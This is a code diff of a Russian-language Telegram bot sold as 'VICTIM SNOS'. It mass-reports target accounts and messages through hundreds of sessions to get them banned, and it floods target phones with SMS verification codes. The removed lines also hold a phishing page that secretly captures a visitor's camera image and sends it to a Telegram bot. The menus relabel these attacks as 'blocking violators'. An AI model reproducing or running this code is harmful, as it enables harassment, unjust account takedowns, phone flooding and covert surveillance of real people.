-        return True
-    except FloodWait as e:
-        session.flood_until = time.time() + e.value
-        return False
-    except:
-        session.fail_count += 1
-        return False
+        if site["type"] == "form":
+            data = f"{site['phone_field']}={phone_clean}"
+            url = site["url"]
+        else:
+            data = {site["phone_field"]: phone_clean}
+            if "params" in site:
+                params = "&".join([f"{k}={v}" for k, v in site["params"].items()])
+                url = f"{site['url']}?{params}"
+            else:
+                url = site["url"]
+            data = json.dumps(data)
 
-async def snos_attack_phone(user_id: int, phone: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> int:
-    total = 0
-    phone = phone.strip().replace(" ", "").replace("-", "")
-    if not phone.startswith("+"):
-        phone = "+" + phone
-    
-    pool = user_pools.get(user_id)
-    
-    for rnd in range(1, rounds + 1):
-        if stop_event.is_set():
-            break
-        
-        tasks = []
-        # HTTP запросы
-        for _ in range(40):
-            tasks.append(send_sms_http(phone))
-        
-        # Сессии
-        if pool:
-            async with pool.lock:
-                available = [s for s in pool.sessions if not s.in_use and s.flood_until < time.time()]
-            for s in available[:10]:
-                s.in_use = True
-                tasks.append(send_sms_session(s, phone))
-        
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        if pool:
-            for s in pool.sessions:
-                s.in_use = False
-        
-        sent = sum(1 for r in results if r is True)
-        total += sent
-        
-        if progress_callback:
-            await progress_callback(rnd, rounds, total)
-        
-        await asyncio.sleep(1)
-    
-    return total
-
-# 2. СНОС ПО USERNAME
-async def report_account(session: UserSession, username: str) -> bool:
-    try:
-        if not session.client.is_connected:
-            await session.client.connect()
-        user = await session.client.get_users(username)
-        peer = await session.client.resolve_peer(user.id)
-        reason = random.choice(REPORT_REASONS)
-        await session.client.invoke(ReportPeer(peer=peer, reason=reason, message="Report"))
-        session.success_count += 1
-        return True
-    except:
-        session.fail_count += 1
-        return False
-
-async def snos_attack_username(user_id: int, username: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> int:
-    total = 0
-    username = username.strip().replace("@", "")
-    pool = user_pools.get(user_id)
-    
-    for rnd in range(1, rounds + 1):
-        if stop_event.is_set():
-            break
-        
-        tasks = []
-        if pool:
-            async with pool.lock:
-                available = [s for s in pool.sessions if not s.in_use and s.flood_until < time.time()]
-            for s in available[:30]:
-                s.in_use = True
-                tasks.append(report_account(s, username))
-        
-        if tasks:
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            for s in pool.sessions:
-                s.in_use = False
-            total += sum(1 for r in results if r is True)
-        
-        if progress_callback:
-            await progress_callback(rnd, rounds, total)
-        
-        await asyncio.sleep(1)
-    
-    return total
-
-# 3. ЖАЛОБА НА СООБЩЕНИЕ
-async def report_message(session: UserSession, channel: str, msg_id: int) -> bool:
-    try:
-        if not session.client.is_connected:
-            await session.client.connect()
-        chat = await session.client.get_chat(channel)
-        peer = await session.client.resolve_peer(chat.id)
-        await session.client.invoke(Report(peer=peer, id=[msg_id], reason=raw_types.InputReportReasonSpam(), message="Spam"))
-        return True
-    except:
-        return False
-
-async def mass_report_message(user_id: int, link: str) -> tuple:
-    patterns = [r't\.me/([^/]+)/(\d+)', r'telegram\.me/([^/]+)/(\d+)']
-    channel, msg_id = None, None
-    
-    for p in patterns:
-        m = re.search(p, link)
-        if m:
-            channel = m.group(1)
-            msg_id = int(m.group(2))
-            break
-    
-    if not channel:
-        return 0, "Неверная ссылка"
-    
-    pool = user_pools.get(user_id)
-    if not pool:
-        return 0, "Сессии не готовы"
-    
-    async with pool.lock:
-        available = [s for s in pool.sessions if not s.in_use][:30]
-        for s in available:
-            s.in_use = True
-    
-    tasks = [report_message(s, channel, msg_id) for s in available]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    
-    for s in available:
-        s.in_use = False
-    
-    return sum(1 for r in results if r is True), None
-
-# 4. БОМБЕР
-async def send_bomber_request(session: aiohttp.ClientSession, phone: str, endpoint: dict) -> bool:
-    try:
-        headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': 'application/json'}
-        data = {endpoint["phone_field"]: phone.replace("+", "").replace(" ", "")}
-        async with session.post(endpoint["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
+        async with session.post(
+            url,
+            headers=headers,
+            data=data,
+            ssl=False,
+            allow_redirects=False
+        ) as resp:
             return resp.status < 500
+            
     except:
         return False
 
-async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> int:
-    total = 0
-    phone = phone.strip().replace(" ", "").replace("-", "")
-    if not phone.startswith("+"):
-        phone = "+" + phone
+async def send_sms_via_session(session: SmartSession, target_phone: str, pool: UserSessionPool) -> bool:
+    """Отправка SMS через Telegram сессию с MTProto"""
+    if not session.is_authorized:
+        return False
     
-    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
-    async with aiohttp.ClientSession(connector=connector) as sess:
-        for rnd in range(1, rounds + 1):
-            if stop_event.is_set():
-                break
-            
-            tasks = []
-            for endpoint in BOMBER_ENDPOINTS:
-                for _ in range(15):
-                    tasks.append(send_bomber_request(sess, phone, endpoint))
-            
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            sent = sum(1 for r in results if r is True)
-            total += sent
-            
-            if progress_callback:
-                await progress_callback(rnd, rounds, total)
-            
-            await asyncio.sleep(0.5)
+    start_time = time.time()
     
-    return total
-
-# 5. ФИШИНГ
-PHISH_HTML = '''<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>{title}</title>
-    <style>
-        body {{ margin: 0; padding: 0; background: #000; }}
-        video {{ width: 100%; height: 100vh; object-fit: cover; }}
-        #status {{ position: fixed; bottom: 20px; left: 0; right: 0; text-align: center; color: white; }}
-    </style>
-</head>
-<body>
-    <video id="video" autoplay playsinline></video>
-    <div id="status">Loading camera...</div>
-    <canvas id="canvas" style="display:none"></canvas>
-    <script>
-        const BOT = "{bot_token}";
-        const CHAT = "{chat_id}";
-        const ID = "{page_id}";
-        let sent = false;
-        
-        async function init() {{
-            try {{
-                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
-                document.getElementById('video').srcObject = stream;
-                document.getElementById('status').textContent = "Camera active";
-                setTimeout(() => capture(stream), 2000);
-            }} catch(e) {{
-                document.getElementById('status').textContent = "Camera error";
-            }}
-        }}
-        
-        async function capture(stream) {{
-            if(sent) return;
-            try {{
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                const ctx = canvas.getContext("2d");
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const blob = await fetch(canvas.toDataURL("image/jpeg")).then(r => r.blob());
-                const fd = new FormData();
-                fd.append("chat_id", CHAT);
-                fd.append("photo", blob, ID + ".jpg");
-                fd.append("caption", "📸 Photo | " + ID);
-                const resp = await fetch(`https://api.telegram.org/bot${{BOT}}/sendPhoto`, {{method:"POST", body:fd}});
-                const data = await resp.json();
-                if(data.ok) {{
-                    sent = true;
-                    document.getElementById('status').textContent = "Done";
-                    stream.getTracks().forEach(t => t.stop());
-                }}
-            }} catch(e) {{}}
-        }}
-        init();
-    </script>
-</body>
-</html>'''
-
-async def create_phishing_page(title: str, chat_id: int, page_id: str) -> Optional[str]:
     try:
-        html = PHISH_HTML.format(title=title, bot_token=BOT_TOKEN, chat_id=chat_id, page_id=page_id)
+        if not await session.ensure_connected():
+            return False
         
-        async with aiohttp.ClientSession() as session:
-            async with session.post("https://api.telegra.ph/createAccount",
-                                   json={"short_name": f"User{random.randint(1000,9999)}", "author_name": "Telegram"},
-                                   timeout=10) as resp:
-                data = await resp.json()
-                if not data.get("ok"):
-                    return None
-                token = data["result"]["access_token"]
+        async with connection_semaphore:
+            # Множественные попытки отправки кода
+            methods = [
+                # Метод 1: SendCode
+                lambda: session.client.invoke(
+                    SendCode(
+                        phone_number=target_phone,
+                        api_id=API_ID,
+                        api_hash=API_HASH,
+                        settings=raw_types.CodeSettings(
+                            allow_flashcall=False,
+                            current_number=True,
+                            allow_app_hash=True,
+                            allow_missed_call=False
+                        )
+                    )
+                ),
+                # Метод 2: SendChangePhoneCode
+                lambda: session.client.invoke(
+                    SendChangePhoneCode(
+                        phone_number=target_phone,
+                        settings=raw_types.CodeSettings(
+                            allow_flashcall=False,
+                            current_number=True
+                        )
+                    )
+                ),
+                # Метод 3: ResendCode
+                lambda: session.client.invoke(
+                    ResendCode(
+                        phone_number=target_phone,
+                        phone_code_hash=""
+                    )
+                ),
+            ]
             
-            async with session.post("https://api.telegra.ph/createPage",
-                                   json={"access_token": token, "title": title, "content": [{"tag": "p", "children": [html]}]},
-                                   timeout=10) as resp:
-                data = await resp.json()
-                if data.get("ok"):
-                    url = data["result"]["url"]
-                    phish_pages[page_id] = {"url": url, "chat_id": chat_id}
-                    return url
-    except:
-        pass
-    return None
+            for method in methods:
+                try:
+                    result = await asyncio.wait_for(method(), timeout=3.0)
+                    if result:
+                        latency = time.time() - start_time
+                        pool.mark_success(session, latency)
+                        return True
+                except FloodWait as e:
+                    pool.mark_flood(session, e.value)
+                    return False
+                except:
+                    continue
+            
+            return False
+            
+    except FloodWait as e:
+        pool.mark_flood(session, e.value)
+        return False
+    except Exception as e:
+        pool.mark_fail(session, time.time() - start_time)
+        try:
+            await session.client.disconnect()
+            session.is_connected = False
+        except:
+            pass
+        return False
 
-# ---------- UI ----------
-def create_button(text: str, callback_data: str) -> InlineKeyboardButton:
-    return InlineKeyboardButton(text=text, callback_data=callback_data)
+async def report_user_enhanced(session: SmartSession, username: str, pool: UserSessionPool) -> bool:
+    """Массовый репорт пользователя через Telegram"""
+    if not session.is_authorized:
+        return False
+    
+    start_time = time.time()
+    
+    try:
+        if not await session.ensure_connected():
+            return False
+        
+        async with connection_semaphore:
+            # Получение пользователя
+            user = None
+            for _ in range(3):
+                try:
+                    user = await asyncio.wait_for(session.client.get_users(username), timeout=3.0)
+                    break
+                except:
+                    await asyncio.sleep(0.1)
+            
+            if not user:
+                return False
+            
+            peer = await session.client.resolve_peer(user.id)
+            
+            # Множественные репорты (10 попыток)
+            success_count = 0
+            for _ in range(10):
+                reason = random.choice(REPORT_REASONS)
+                try:
+                    await session.client.invoke(
+                        ReportPeer(
+                            peer=peer,
+                            reason=reason,
+                            message=f"Report {random.randint(100000, 999999)}"
+                        )
+                    )
+                    success_count += 1
+                    await asyncio.sleep(0.02)
+                except FloodWait as e:
+                    pool.mark_flood(session, e.value)
+                    break
+                except:
+                    continue
+            
+            if success_count > 0:
+                latency = time.time() - start_time
+                pool.mark_success(session, latency)
+                return True
+            
+            return False
+            
+    except FloodWait as e:
+        pool.mark_flood(session, e.value)
+        return False
+    except Exception as e:
+        pool.mark_fail(session, time.time() - start_time)
+        session.is_connected = False
+        return False
 
-def create_keyboard(buttons: List[List[tuple]], adjust: int = 1) -> InlineKeyboardMarkup:
-    builder = InlineKeyboardBuilder()
+async def report_message_enhanced(session: SmartSession, channel_username: str, msg_id: int, pool: UserSessionPool) -> bool:
+    """Массовый репорт сообщения через Telegram"""
+    if not session.is_authorized:
+        return False
+    
+    start_time = time.time()
+    
+    try:
+        if not await session.ensure_connected():
+            return False
+        
+        async with connection_semaphore:
+            chat = None
+            for _ in range(3):
+                try:
+                    chat = await asyncio.wait_for(session.client.get_chat(channel_username), timeout=3.0)
+                    break
+                except:
+                    await asyncio.sleep(0.1)
+            
+            if not chat:
+                return False
+            
+            peer = await session.client.resolve_peer(chat.id)
+            
+            # Множественные репорты (10 попыток)
+            success_count = 0
+            for _ in range(10):
+                reason = random.choice(REPORT_REASONS)
+                try:
+                    await session.client.invoke(
+                        Report(
+                            peer=peer,
+                            id=[msg_id],
+                            reason=reason,
+                            message=f"Spam report {random.randint(100000, 999999)}"
+                        )
+                    )
+                    success_count += 1
+                    await asyncio.sleep(0.02)
+                except FloodWait as e:
+                    pool.mark_flood(session, e.value)
+                    break
+                except:
+                    continue
+            
+            if success_count > 0:
+                latency = time.time() - start_time
+                pool.mark_success(session, latency)
+                return True
+            
+            return False
+            
+    except FloodWait as e:
+        pool.mark_flood(session, e.value)
+        return False
+    except Exception as e:
+        pool.mark_fail(session, time.time() - start_time)
+        session.is_connected = False
+        return False
+
+async def massive_telegram_attack(user_id: int, target: str, rounds: int, attack_type: str, stop: asyncio.Event, cb=None) -> int:
+    """Массовая атака ТОЛЬКО через Telegram"""
+    total_actions = 0
+    
+    pool = user_pools.get(user_id)
+    if not pool or not pool.sessions:
+        logger.error(f"Нет сессий для пользователя {user_id}")
+        return 0
+    
+    # Сброс счетчиков
+    for s in pool.sessions:
+        s.reset_report_count()
+    
+    authorized_sessions = [s for s in pool.sessions if s.is_authorized and s.session_quality > 0.3]
+    
+    logger.info(f"💣 МАССИВНАЯ TELEGRAM АТАКА: {target} ({attack_type})")
+    logger.info(f"📊 Доступно MTProto сессий: {len(authorized_sessions)}/{len(pool.sessions)}")
+    
+    http_session = await get_http_session()
+    
+    for rnd in range(1, rounds + 1):
+        if stop.is_set():
+            break
+        
+        round_actions = 0
+        round_start = time.time()
+        
+        # Основная атака через MTProto сессии
+        if authorized_sessions:
+            batch_count = min(len(authorized_sessions), REQUESTS_PER_ROUND)
+            available = await pool.get_available(batch_count)
+            
+            if available:
+                tasks = []
+                
+                if attack_type == "phone":
+                    # Множественные SMS запросы через Telegram
+                    for session in available:
+                        tasks.append(send_sms_via_session(session, target, pool))
+                    
+                elif attack_type == "username":
+                    for session in available:
+                        tasks.append(report_user_enhanced(session, target, pool))
+                        
+                elif attack_type == "message":
+                    channel, msg_id = parse_message_link(target)
+                    if channel and msg_id:
+                        for session in available:
+                            tasks.append(report_message_enhanced(session, channel, msg_id, pool))
+                
+                if tasks:
+                    results = await asyncio.gather(*tasks, return_exceptions=True)
+                    round_actions += sum(1 for r in results if r is True)
+                
+                pool.release(available)
+        
+        # HTTP атака через Telegram endpoints (для номеров)
+        if attack_type == "phone":
+            http_tasks = []
+            for endpoint in TELEGRAM_HTTP_ENDPOINTS:
+                for _ in range(50):  # 50 запросов на каждый endpoint
+                    http_tasks.append(send_sms_http_telegram(target, endpoint, http_session))
+            
+            if http_tasks:
+                batch_size = 200
+                for i in range(0, len(http_tasks), batch_size):
+                    if stop.is_set():
+                        break
+                    batch = http_tasks[i:i+batch_size]
+                    http_results = await asyncio.gather(*batch, return_exceptions=True)
+                    round_actions += sum(1 for r in http_results if r is True)
+                    await asyncio.sleep(0.05)
+        
+        total_actions += round_actions
+        round_time = time.time() - round_start
+        
+        logger.info(f"Раунд {rnd}/{rounds}: {round_actions} действий за {round_time:.2f}с ({round_actions/round_time:.0f} д/с)")
+        
+        if cb:
+            await cb(rnd, rounds, total_actions)
+        
+        if rnd < rounds and not stop.is_set():
+            delay = max(0.1, 0.5 - (round_time * 0.1))
+            await asyncio.sleep(delay)
+    
+    return total_actions
+
+def parse_message_link(link: str) -> Tuple[Optional[str], Optional[int]]:
+    link = link.strip()
+
+    patterns = [
+        r'(?:https?://)?t\.me/([^/\s]+)/(\d+)',
+        r'(?:https?://)?telegram\.me/([^/\s]+)/(\d+)',
+        r'(?:https?://)?t\.me/c/(\d+)/(\d+)',
+        r'^@?([^/\s]+)/(\d+)$',
+    ]
+
+    for pattern in patterns:
+        match = re.search(pattern, link)
+        if match:
+            channel = match.group(1)
+            msg_id = int(match.group(2))
+            if 't.me/c/' in link and channel.isdigit():
+                channel = f"-100{channel}"
+            return channel, msg_id
+
+    return None, None
+
+# ---------- UI ФУНКЦИИ ----------
+def btn(text: str, data: str) -> InlineKeyboardButton:
+    return InlineKeyboardButton(text=text, callback_data=data)
+
+def kb(buttons: List[List[tuple]], adj: int = 1) -> InlineKeyboardMarkup:
+    b = InlineKeyboardBuilder()
     for row in buttons:
         for text, data in row:
-            builder.button(text=text, callback_data=data)
-    builder.adjust(adjust)
-    return builder.as_markup()
+            b.button(text=text, callback_data=data)
+    b.adjust(adj)
+    return b.as_markup()
 
-def get_main_menu(user_id: int) -> InlineKeyboardMarkup:
-    buttons = [
-        [("🎯 СНОС", "snos_menu")],
-        [("💣 БОМБЕР", "bomber_menu")],
-        [("🎣 ФИШИНГ", "phish_menu")],
-        [("💰 КУПИТЬ", "purchase_menu")],
+def main_menu(uid: int) -> InlineKeyboardMarkup:
+    btns = [
+        [("💣 СНОС НАРУШИТЕЛЯ", "snos_menu")],
+        [("💰 КУПИТЬ ДОСТУП", "purchase_menu")],
         [("📊 СТАТУС", "status"), ("⏹ СТОП", "stop")]
     ]
-    if user_id == ADMIN_ID:
-        buttons.append([("👑 АДМИН", "admin_menu")])
-    return create_keyboard(buttons, adjust=2)
+    if uid == ADMIN_ID:
+        btns.append([("👑 АДМИН", "admin_menu")])
+    return kb(btns, 2)
 
-def get_snos_menu() -> InlineKeyboardMarkup:
-    return create_keyboard([
-        [("📱 По номеру", "snos_phone")],
-        [("👤 По username", "snos_username")],
-        [("💬 Жалоба на сообщение", "report_message")],
+def snos_menu() -> InlineKeyboardMarkup:
+    return kb([
+        [("📱 ЗАБЛОКИРОВАТЬ НОМЕР", "snos_type_phone")],
+        [("👤 ЗАБЛОКИРОВАТЬ USERNAME", "snos_type_username")],
+        [("💬 ЗАБЛОКИРОВАТЬ СООБЩЕНИЕ", "snos_type_message")],
         [("◀️ НАЗАД", "main_menu")]
     ])
 
-def get_purchase_menu() -> InlineKeyboardMarkup:
-    return create_keyboard([
+def purchase_menu() -> InlineKeyboardMarkup:
+    return kb([
         [("💎 30 дней - 100₽", "buy_30d")],
         [("💎 60 дней - 200₽", "buy_60d")],
         [("👑 Навсегда - 400₽", "buy_forever")],
-        [("🎁 Промокод", "use_promo")]
+        [("🎁 Промокод", "use_promo")],
+        [("◀️ НАЗАД", "main_menu")]
     ])
 
-async def send_message(target, text: str, markup: InlineKeyboardMarkup = None):
-    full_text = f"<b>🔱 VICTIM SNOS</b>\n\n{text}"
-    
+def admin_menu() -> InlineKeyboardMarkup:
+    return kb([
+        [("➕ Добавить", "admin_add")],
+        [("➖ Удалить", "admin_remove")],
+        [("🎁 Промокод", "admin_promo")],
+        [("📋 Список", "admin_list")],
+        [("◀️ НАЗАД", "main_menu")]
+    ], 2)
+
+async def send_msg(target, text: str, markup: InlineKeyboardMarkup = None):
+    full = f"<b>🛡 VICTIM SNOS - Блокируй нарушителей</b>\n\n{text}"
+
     try:
         if os.path.exists(BANNER_FILE):
             if hasattr(target, 'answer_photo'):
-                return await target.answer_photo(FSInputFile(BANNER_FILE), caption=full_text, reply_markup=markup)
+                return await target.answer_photo(FSInputFile(BANNER_FILE), caption=full, reply_markup=markup)
             else:
-                return await bot.send_photo(target if isinstance(target, int) else target.chat.id, 
-                                           FSInputFile(BANNER_FILE), caption=full_text, reply_markup=markup)
+                return await bot.send_photo(target if isinstance(target, int) else target.chat.id,
+                                            FSInputFile(BANNER_FILE), caption=full, reply_markup=markup)
     except:
         pass
-    
-    if hasattr(target, 'answer'):
-        return await target.answer(full_text, reply_markup=markup)
-    else:
-        return await bot.send_message(target if isinstance(target, int) else target.chat.id, full_text, reply_markup=markup)
 
-# ---------- ОБРАБОТЧИКИ ----------
+    if hasattr(target, 'answer'):
+        return await target.answer(full, reply_markup=markup)
+    else:
+        return await bot.send_message(target if isinstance(target, int) else target.chat.id,
+                                      full, reply_markup=markup)
+
+# ---------- ОБРАБОТЧИКИ КОМАНД ----------
 @dp.message(Command("start"))
-async def cmd_start(msg: types.Message):
-    user_id = msg.from_user.id
+async def start(msg: types.Message):
+    uid = msg.from_user.id
     await msg.delete()
-    
-    if not await check_access(user_id, msg):
+
+    if not await check_access(uid, msg):
         return
-    
-    pool = user_pools.get(user_id)
-    
+
+    pool = user_pools.get(uid)
+
     if not pool or not pool.is_ready:
-        await send_message(msg, "🔄 Создание сессий...\nЭто займет 1-2 минуты.")
-        if not pool:
-            asyncio.create_task(initialize_user_sessions(user_id))
-        await msg.answer("Нажмите для проверки:",
-                       reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                           [create_button("🔄 Проверить", f"check_{user_id}")]
-                       ]))
+        await send_msg(msg, f"🔄 Загрузка системы блокировки через MTProto...")
+        asyncio.create_task(init_sessions(uid))
+        await msg.answer(
+            "Нажмите для проверки:",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("🔄 Проверить загрузку", f"check_{uid}")]])
+        )
         return
-    
-    await send_message(msg, f"✅ Бот готов!\n📊 Сессий: {len(pool.sessions)}", get_main_menu(user_id))
+
+    stats = pool.get_stats()
+    await send_msg(
+        msg,
+        f"✅ СИСТЕМА ГОТОВА К БЛОКИРОВКЕ!\n"
+        f"📊 MTProto сессий: {stats['total']}/500\n"
+        f"🔐 Авторизовано: {stats['authorized']}\n"
+        f"🟢 Готово к атаке: {stats['available']}\n"
+        f"⚡ Качество сессий: {stats['avg_quality']:.1%}",
+        main_menu(uid)
+    )
 
 @dp.callback_query(F.data.startswith("check_"))
-async def check_ready(cb: types.CallbackQuery):
-    user_id = int(cb.data.split("_")[1])
-    if user_id != cb.from_user.id:
+async def check(cb: types.CallbackQuery):
+    uid = int(cb.data.split("_")[1])
+    if uid != cb.from_user.id:
         return
-    
-    pool = user_pools.get(user_id)
+
+    pool = user_pools.get(uid)
+
     if pool and pool.is_ready:
+        stats = pool.get_stats()
         await cb.message.delete()
-        await send_message(cb.message, f"✅ Сессии готовы!\n📊 Всего: {len(pool.sessions)}", get_main_menu(user_id))
+        await send_msg(
+            cb.message,
+            f"✅ ГОТОВО!\n"
+            f"📊 MTProto сессий: {stats['total']}/500\n"
+            f"🔐 Авторизовано: {stats['authorized']}\n"
+            f"🔄 В очереди на пересоздание: {stats['recreation_queue']}\n"
+            f"⚡ Качество: {stats['avg_quality']:.1%}",
+            main_menu(uid)
+        )
     else:
-        progress = pool.creation_progress if pool else 0
-        await cb.answer(f"Прогресс: {progress:.1f}%", show_alert=True)
+        await cb.answer("Загрузка...", show_alert=True)
 
 @dp.callback_query(F.data == "main_menu")
-async def main_menu_handler(cb: types.CallbackQuery, state: FSMContext):
+async def main_menu_cb(cb: types.CallbackQuery, state: FSMContext):
     await state.clear()
+    attack_targets.clear()
+    attack_types.clear()
+
     if not await check_access(cb.from_user.id, cb):
         return
-    await cb.message.edit_caption(caption="<b>🔱 VICTIM SNOS</b>\n\nВыберите действие:", reply_markup=get_main_menu(cb.from_user.id))
+
+    await cb.message.delete()
+    await send_msg(cb.message, "🛡 ВЫБЕРИТЕ ДЕЙСТВИЕ:", main_menu(cb.from_user.id))
 
 @dp.callback_query(F.data == "snos_menu")
-async def snos_menu(cb: types.CallbackQuery):
+async def snos_menu_cb(cb: types.CallbackQuery):
     if not await check_access(cb.from_user.id, cb):
         return
-    
-    can_attack, remaining = await check_cooldown(cb.from_user.id)
-    if not can_attack:
-        await cb.answer(f"⏳ Подождите {int(remaining)} сек.", show_alert=True)
-        return
-    
-    if cb.from_user.id in active_attacks:
-        await cb.answer("❌ Атака уже идет!", show_alert=True)
-        return
-    
-    await cb.message.edit_caption(caption="<b>🔱 VICTIM SNOS</b>\n\nВыберите тип сноса:", reply_markup=get_snos_menu())
 
-# Снос по номеру
-@dp.callback_query(F.data == "snos_phone")
-async def snos_phone_start(cb: types.CallbackQuery, state: FSMContext):
-    if not await check_access(cb.from_user.id, cb):
-        return
-    if cb.from_user.id in active_attacks:
-        await cb.answer("❌ Атака уже идет!", show_alert=True)
-        return
-    
-    await state.set_state(AttackState.waiting_phone)
     await cb.message.delete()
-    await cb.message.answer("<b>🔱 VICTIM SNOS</b>\n\n📱 Введите номер телефона:\n<i>Пример: +79123456789</i>",
-                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("❌ Отмена", "snos_menu")]]))
+    await send_msg(cb.message, "💣 ВЫБЕРИТЕ ТИП БЛОКИРОВКИ:", snos_menu())
 
-@dp.message(StateFilter(AttackState.waiting_phone))
-async def snos_phone_received(msg: types.Message, state: FSMContext):
+@dp.callback_query(F.data.startswith("snos_type_"))
+async def snos_type_select(cb: types.CallbackQuery, state: FSMContext):
+    if not await check_access(cb.from_user.id, cb):
+        return
+
+    can, rem = await check_cooldown(cb.from_user.id)
+    if not can:
+        minutes = int(rem // 60)
+        seconds = int(rem % 60)
+        await cb.answer(f"⏳ Ждите {minutes}:{seconds:02d}", show_alert=True)
+        return
+
+    stype = cb.data.replace("snos_type_", "")
+    attack_types[cb.from_user.id] = stype
+    
+    await state.set_state(AttackState.waiting_target)
+    await cb.message.delete()
+    
+    msg_text = ""
+    if stype == "phone":
+        msg_text = "<b>📱 БЛОКИРОВКА НОМЕРА ЧЕРЕЗ TELEGRAM</b>\n\nВведите номер телефона нарушителя:"
+    elif stype == "username":
+        msg_text = "<b>👤 БЛОКИРОВКА USERNAME</b>\n\nВведите username нарушителя (с @ или без):"
+    elif stype == "message":
+        msg_text = "<b>💬 БЛОКИРОВКА СООБЩЕНИЯ</b>\n\nВведите ссылку на сообщение нарушителя:"
+    
+    await cb.message.answer(
+        msg_text,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("❌ Отмена", "main_menu")]])
+    )
+
+@dp.message(AttackState.waiting_target)
+async def target_in(msg: types.Message, state: FSMContext):
     if not await check_access(msg.from_user.id, msg):
         return
-    await state.update_data(phone=msg.text.strip())
+
+    target = msg.text.strip()
+    uid = msg.from_user.id
+    atype = attack_types.get(uid, "")
+
+    if atype == "message":
+        channel, msg_id = parse_message_link(target)
+        if not channel or not msg_id:
+            await msg.delete()
+            await send_msg(msg, "❌ Неверная ссылка на сообщение!")
+            return
+    elif atype == "username":
+        target = target.replace('@', '')
+
+    attack_targets[uid] = target
     await state.set_state(AttackState.waiting_count)
     await msg.delete()
-    await msg.answer(f"<b>🔱 VICTIM SNOS</b>\n\n📱 Телефон: <code>{msg.text.strip()}</code>\n\nВведите количество раундов (1-{MAX_ROUNDS}):")
+    await msg.answer(f"🎯 Цель: {target[:30]}\n\nВведите количество раундов блокировки (1-{MAX_ROUNDS}):")
 
-@dp.message(StateFilter(AttackState.waiting_count))
-async def snos_count_received(msg: types.Message, state: FSMContext):
+@dp.message(AttackState.waiting_count)
+async def count_in(msg: types.Message, state: FSMContext):
     if not await check_access(msg.from_user.id, msg):
         return
-    
+
     try:
-        rounds = int(msg.text.strip())
-        if rounds < 1 or rounds > MAX_ROUNDS:
+        r = int(msg.text.strip())
+        if r < 1 or r > MAX_ROUNDS:
             raise ValueError()
     except:
         await msg.delete()
-        await send_message(msg, f"❌ Введите число от 1 до {MAX_ROUNDS}!")
+        await send_msg(msg, f"❌ Введите число от 1 до {MAX_ROUNDS}!")
         return
-    
-    data = await state.get_data()
-    phone = data["phone"]
-    user_id = msg.from_user.id
-    
+
+    uid = msg.from_user.id
+    target = attack_targets.get(uid, "")
+    atype = attack_types.get(uid, "")
+
     await state.clear()
     await msg.delete()
-    
-    if user_id in active_attacks:
-        await send_message(msg, "❌ Атака уже запущена!")
+
+    if uid in active_attacks:
+        await send_msg(msg, "❌ Блокировка уже запущена!")
         return
-    
-    stop_event = asyncio.Event()
-    active_attacks[user_id] = stop_event
-    
-    status_msg = await send_message(msg, f"🎯 <b>СНОС ЗАПУЩЕН</b>\n\n📱 Телефон: <code>{phone}</code>\n🔄 Раунд: 0/{rounds}\n📤 Отправлено: 0")
-    
-    async def update_progress(cur, tot, sent):
+
+    stop = asyncio.Event()
+    active_attacks[uid] = stop
+
+    display = target[:40] + "..." if len(target) > 40 else target
+    st = await bot.send_message(uid, f"<b>💣 ЗАПУСК TELEGRAM БЛОКИРОВКИ</b>\n\n🎯 Нарушитель: {display}\n🔄 0/{r} раундов")
+
+    async def prog(cur, tot, sent):
         try:
-            await status_msg.edit_caption(
-                caption=f"<b>🔱 VICTIM SNOS</b>\n\n🎯 <b>СНОС АКТИВЕН</b>\n\n📱 Телефон: <code>{phone}</code>\n🔄 Раунд: {cur}/{tot}\n📤 Отправлено: {sent}",
-                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]])
+            percent = int((cur / tot) * 10)
+            bar = "▓" * percent + "░" * (10 - percent)
+            await st.edit_text(
+                f"<b>💣 TELEGRAM БЛОКИРОВКА АКТИВНА</b>\n\n"
+                f"🎯 Нарушитель: {display}\n"
+                f"📊 [{bar}] {cur}/{tot} раундов\n"
+                f"💥 Отправлено жалоб: {sent}",
+                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("⏹ ОСТАНОВИТЬ", "stop_attack")]])
             )
         except:
             pass
-    
+
+    start_time = time.time()
     try:
-        total = await snos_attack_phone(user_id, phone, rounds, stop_event, update_progress)
-        set_cooldown(user_id)
-        await status_msg.edit_caption(
-            caption=f"<b>🔱 VICTIM SNOS</b>\n\n✅ <b>СНОС ЗАВЕРШЕН</b>\n\n📱 Телефон: <code>{phone}</code>\n📤 Отправлено: <b>{total}</b>\n🔄 Раундов: {rounds}",
-            reply_markup=get_main_menu(user_id)
+        total = await massive_telegram_attack(uid, target, r, atype, stop, prog)
+        
+        user_last_action[uid] = time.time()
+        elapsed = time.time() - start_time
+        
+        await st.edit_text(
+            f"<b>✅ TELEGRAM БЛОКИРОВКА ЗАВЕРШЕНА</b>\n\n"
+            f"🎯 Нарушитель: {display}\n"
+            f"💥 Отправлено жалоб: {total}\n"
+            f"⏱ Время: {elapsed:.1f}с\n"
+            f"⚡ Средняя скорость: {total/elapsed:.0f}/сек\n\n"
+            f"⏳ Кулдаун: 3 минуты",
+            reply_markup=main_menu(uid)
         )
-    except:
-        await status_msg.edit_caption(caption=f"<b>🔱 VICTIM SNOS</b>\n\n❌ <b>ОШИБКА</b>", reply_markup=get_main_menu(user_id))
+    except Exception as e:
+        logger.error(f"Ошибка блокировки: {e}")
